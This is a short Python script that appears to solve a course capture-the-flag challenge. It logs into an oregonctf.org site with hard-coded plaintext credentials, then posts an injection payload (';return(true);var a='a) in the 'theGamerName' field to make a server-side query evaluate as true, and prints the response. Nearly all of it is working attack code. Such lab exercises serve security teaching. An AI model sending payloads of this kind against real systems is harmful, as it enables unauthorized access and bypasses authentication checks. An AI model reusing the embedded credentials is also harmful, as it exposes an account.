import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/d63c2fb5da9b81ca26237f1308afe54491d1bacf9fffa0b21a072b03c5bafe66"

postData = {"theGamerName":"\';return(true);var a=\'a"}
response2 = session.post(targetUrl, data=postData)
print(response2.text)
